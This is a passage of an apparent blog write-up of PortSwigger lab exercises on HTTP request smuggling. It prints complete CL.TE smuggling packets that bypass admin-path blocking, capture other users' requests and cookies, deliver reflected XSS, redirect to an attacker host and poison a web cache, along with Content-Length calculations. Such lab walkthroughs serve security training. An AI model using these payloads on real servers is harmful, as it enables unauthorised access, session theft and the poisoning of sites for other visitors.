class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: acfd1f201f5fb528809b582e004200a3.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 4</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="hljs-attribute">Transfer-encoding</span>: nothing</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">12</span></span><br></pre></td></tr></table></figure><p>The second:</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GPOST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></table></figure><p>This sent an unrecognized HTTP Method GPOST request.</p><h2 id="Attack-Surface"><a href="#Attack-Surface" class="headerlink" title="Attack Surface"></a>Attack Surface</h2><p>Above we have introduced several attack methods, let us see what these attack methods can be used for. We will also cooperate with the experimental environment to help understand and reproduce.</p><h3 id="Bypass-Front-end-Security-Controls"><a href="#Bypass-Front-end-Security-Controls" class="headerlink" title="Bypass Front-end Security Controls"></a>Bypass Front-end Security Controls</h3><p>Two experimental environments are provided here. One is CL-TE <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</a>  and the othter is TE-CL <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability</a>.The two experiments finally achieved the same goal. Here we randomly choose CL-TE for experiments.</p><blockquote><pre><code>This lab involves a front-end and back-end server, and the front-end server doesn&apos;t support chunked encoding. There&apos;s an admin panel at /admin, but the front-end server blocks access to it.To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.</code></pre></blockquote><p>The architecture is the same, but this time we need to use HTTP Smuggling to obtain admin permissions and delete the carlos user.</p><p>After we generate the LAB, if we directly access <code>/admin</code>, we will find<code>&quot;Path / admin is blocked&quot;</code>. It seems that we cannot access<code>/admin</code> through normal methods. Then we try HTTP Smuggling and send the following data packet twice.</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 28</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /admin HTTP/1.1</span><br></pre></td></tr></table></figure><p>The response obtained is as follows.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123154656.png" alt></p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123154609.png" alt></p><p>You can see that the second request we got the response of <code>/admin</code></p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container is-page&quot;</span>&gt;</span></span><br><span class="line">  Admin interface only available if logged in as an administrator, or if requested as localhost</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>So we add the HOST header and send it again a few times</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 45</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: localhost</span><br></pre></td></tr></table></figure><p>We can see that the content of the <code>/admin</code> panel. If it dosen&#x2019;t work, you can send it a few times.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123155053.png" alt></p><p>We got the deleted api, so we can use HTTP Smuggling to access this <code>/admin/delete?username=carlos</code>, and construct the following data packet.</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 63</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: localhost</span><br></pre></td></tr></table></figure><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123155603.png" alt></p><p>This attack method is similar to HTTP SSRF. The main point is to control the value of CL. For example, the value of CL in the first packet is 28, which is calculated as follows:</p><figure class="highlight livescript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span><span class="hljs-string">\r\n</span><span class="hljs-function">--&gt;</span> <span class="hljs-number">3</span> bytes</span><br><span class="line"><span class="hljs-string">\r\n</span><span class="hljs-function">--&gt;</span> <span class="hljs-number">2</span> bytes</span><br><span class="line">GET /admin HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">\r\n</span><span class="hljs-function">--&gt;</span> <span class="hljs-number">19</span>+<span class="hljs-number">2</span> = <span class="hljs-number">21</span> bytes</span><br><span class="line"><span class="hljs-string">\r\n</span><span class="hljs-function">--&gt;</span> <span class="hljs-number">2</span> bytes</span><br></pre></td></tr></table></figure><p>So it is  3+2+21+2 = 28 bytes in total.</p><p>The situation of TE-CL is similar, so the example will not be repeated here.</p><h3 id="Revealing-Front-end-Request-Rewriting"><a href="#Revealing-Front-end-Request-Rewriting" class="headerlink" title="Revealing Front-end Request Rewriting"></a>Revealing Front-end Request Rewriting</h3><blockquote><pre><code>In some network environments, the front-end proxy server does not forward the request directly to the back-end server after receiving the request. Instead, it adds some necessary fields and then forwards it to the back-end server. These fields are required by the backend server to process the request, such as:- Describe the protocol name and password used by the TLS connection- XFF header containing the user&apos;s IP address- User&apos;s session token IDIn short, if we can&apos;t get the fields added or rewritten by the proxy server, our smuggled past requests can&apos;t be processed correctly by the backend server. So how do we get these values? PortSwigger provides a very simple method, mainly in three major steps:- Find a POST request that can output the value of the request parameter to the response- Put the special parameter found in the POST request at the end of the message.- Then smuggle this request and then send a normal request directly, and some fields that the front-end server rewrites for this request will be displayed.</code></pre></blockquote><p>Sometimes the Front server adds some request headers to the forwarded request and forwards them to the Backend server. We can use HTTP Smuggling to leak these request headers. We also use LAB to understand. <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn&#x2019;t support chunked encoding.</p><p>There&#x2019;s an admin panel at /admin, but it&#x2019;s only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It&#x2019;s similar to the X-Forwarded-For header but has a different name.</p><p>To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.</p></blockquote><p>According to the title hint here, the scene is a CL-TE scene and a search box is given. We try to search for a 123 at will. We can find that the search result &#x201C;123&#x201D; is directly echoed into the corresponding one.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124191719.png" alt></p><p>Attempted access using HTTP Smuggling, but was blocked.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124203138.png" alt></p><p>But we can try to use the search echo to leak the request header forwarded by the Front server:</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124202357.png" alt></p><p>If you only add the X-*-Ip request header later, you cannot access the admin panel, because this will make Backend receive two duplicate request headers. In this scenario, the Backend server judges the duplicate request headers.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124204018.png" alt></p><p>So we need to &#x201C;hide&#x201D; the request headers added by the Front server, we can use Smuggling to &#x201C;hide&#x201D; the request headers added by other Front servers, and then we can get the admin panel.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124203108.png" alt></p><p>The whole process looks relatively simple, but if you do it carefully, you will find the CL value is quite important. Let&#x2019;s take a look at how the CL value of the packet requested by the Front is calculated:</p><figure class="highlight ocaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>\r\n--&gt;<span class="hljs-number">3</span> <span class="hljs-built_in">bytes</span></span><br><span class="line">\r\n--&gt; <span class="hljs-number">2</span> <span class="hljs-built_in">bytes</span></span><br><span class="line"><span class="hljs-type">POST</span> / <span class="hljs-type">HTTP</span>/<span class="hljs-number">1.1</span>\r\n--&gt;<span class="hljs-number">17</span> <span class="hljs-built_in">bytes</span></span><br><span class="line"><span class="hljs-type">Content</span>-<span class="hljs-type">Length</span>: <span class="hljs-number">70</span>\r\n--&gt;<span class="hljs-number">20</span> <span class="hljs-built_in">bytes</span></span><br><span class="line"><span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: application/x-www-form-urlencoded\r\n--&gt;<span class="hljs-number">49</span> <span class="hljs-built_in">bytes</span></span><br><span class="line">\r\n--&gt; <span class="hljs-number">2</span> <span class="hljs-built_in">bytes</span></span><br><span class="line">search=<span class="hljs-number">123</span>--&gt; <span class="hljs-number">10</span> <span class="hljs-built_in">bytes</span></span><br></pre></td></tr></table></figure><p>There are 103 bytes in total. And the CL here may not be 70. Here, we only control how many bytes are leaked.</p><p>Another thing to note is that if you don&#x2019;t add a Content-Type field, you need to add a CRLF at the end, otherwise it will return 400.</p><h3 id="Capturing-other-users&#x2019;-requests"><a href="#Capturing-other-users&#x2019;-requests" class="headerlink" title="Capturing other users&#x2019; requests"></a>Capturing other users&#x2019; requests</h3><p>Now that we can get middleware requests, of course, we can also try to get requests from other users, and also get cookies, etc. <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to capture other users&#x2019; requests</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn&#x2019;t support chunked encoding.</p><p>To solve the lab, smuggle a request to the back-end server that causes the next user&#x2019;s request to be stored in the application. Then retrieve the next user&#x2019;s request and use the victim user&#x2019;s cookies to access their account.</p></blockquote><p>The principle is relatively simple. We can find a place to send a comment, and then use the comment to perform HTTP Smuggling. For example, we can construct the following request packet.</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac951f7d1e9ea625803c617f003f005c.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 271</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 600</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At</span><br><span class="line"></span><br><span class="line">csrf=oIjWmI8aLjIzqX18n5mNCnJieTnOVWPN&amp;postId=5&amp;name=1&amp;email=1%40qq.com&amp;website=http%3A%2F%2Fwww.baidu.com&amp;comment=1</span><br></pre></td></tr></table></figure><p>As long as the later CL is large enough, we can use HTTP Smuggling to stitch the next user&#x2019;s request into our last comment parameter, and then we can see the request header of others when we look at the comment.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124213544.png" alt></p><h3 id="Exploit-Reflected-XSS"><a href="#Exploit-Reflected-XSS" class="headerlink" title="Exploit Reflected XSS"></a>Exploit Reflected XSS</h3><p>This usage scenario may be limited and rare, but if HTTP Smuggling &amp; reflected XSS exists, we can combinate two methods to leak others&#x2019; cookies.</p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn&#x2019;t support chunked encoding.</p><p>The application is also vulnerable to <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank" rel="noopener">reflected XSS</a> via the User-Agent header.</p><p>To solve the lab, smuggle a request to the back-end server that causes the next user&#x2019;s request to receive a response containing an XSS exploit that executes alert(1).</p></blockquote><p>Still in the CL-TE, we can find a reflection XSS at the UA, but this is useless, so we have to find some way to upgrade the hazard.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124235543.png" alt></p><p>We can construct the following packets, just send them once.</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac811f011e27d43b80301693005a0007.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=iSxMvTrkiVN2G5N7EF7MTKgXGRE6A5xZ</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 150</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /post?postId=5 HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 5</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure><p>Then we casually visit any page on the site and it will <code>alert(1)</code> because our request is embedded in the second request above.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191125000410.png" alt></p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191125001149.png" alt></p><h3 id="Turn-An-On-Site-Redirect-Into-An-Open-Redirect"><a href="#Turn-An-On-Site-Redirect-Into-An-Open-Redirect" class="headerlink" title="Turn An On-Site Redirect Into An Open Redirect"></a>Turn An On-Site Redirect Into An Open Redirect</h3><p>This attack scenario is when the target uses a 30x code to redirect and uses the Host header to redirect. For example, we send following requests.</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/home</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: normal-website.com</span><br></pre></td></tr></table></figure><p>We will get responses.</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">301</span> Moved Permanently</span><br><span class="line"><span class="hljs-attribute">Location</span>: https://normal-website.com/home/</span><br></pre></td></tr></table></figure><p>It looks harmless, but if we cooperate with HTTP Smuggling, it will be a problem. Such as:</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 54</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /home HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: attacker-website.com</span><br><span class="line"><span class="hljs-attribute">Foo</span>: X</span><br></pre></td></tr></table></figure><p>The subsequent requests after smuggling look like this:</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/home</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: attacker-website.com</span><br><span class="line"><span class="hljs-attribute">Foo</span>: XGET /scripts/include.js HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br></pre></td></tr></table></figure><p>Then if the server redirects according to the Host header, we will get the following response.</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">301</span> Moved Permanently</span><br><span class="line"><span class="hljs-attribute">Location</span>: https://attacker-website.com/home/</span><br></pre></td></tr></table></figure><p>In this way, the user who visits <code>/scripts/include.js</code> will be redirected to the URL we control.</p><h3 id="Perform-Web-Cache-Poisoning"><a href="#Perform-Web-Cache-Poisoning" class="headerlink" title="Perform Web Cache Poisoning"></a>Perform Web Cache Poisoning</h3><p>This scenario is also based on the Host redirect attack scenario above. If the Front server still has cache static resources, we can cooperate with HTTP Smuggling to perform cache poisoning. <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to perform web cache poisoning</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn&#x2019;t support chunked encoding. The front-end server is configured to cache certain responses.</p><p>To solve the lab, perform a <a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">request smuggling</a> attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server.</p></blockquote><p>This environment is also a scenario where the host can be modified to redirect, and the <code>/post/next?postId=2</code> route redirect to <code>/post?postId=4</code>.</p><p>According to the description of the call, we need to implement cache poisoning. For example, here we choose <code>/resources/js/tracking.js</code> for poisoning. LAB also gives us a service for manufacturing poisoning, so we can set the following settings.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129014911.png" alt></p><p>Send the following packets once.</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac7a1f141fadd93d801c469f005500bf.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=f6c7ZBB52a6iedorGSywc8jM6USu4685</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 178</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /post/next?postId=3 HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac701fe61fabd97b8027465701f800a8.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 10</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure><p>Then visit <code>/resources/js/tracking.js</code>:</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129015245.png" alt></p><p>We can see that the redirect address of the response packet has been changed to the our exploit address, and then we visit the normal server homepage.</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129015530.png" alt></p><p>We can <code>alert(1)</code> !</p><p>The entire process can be understood using the following processes.</p><figure class="highlight gherkin hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 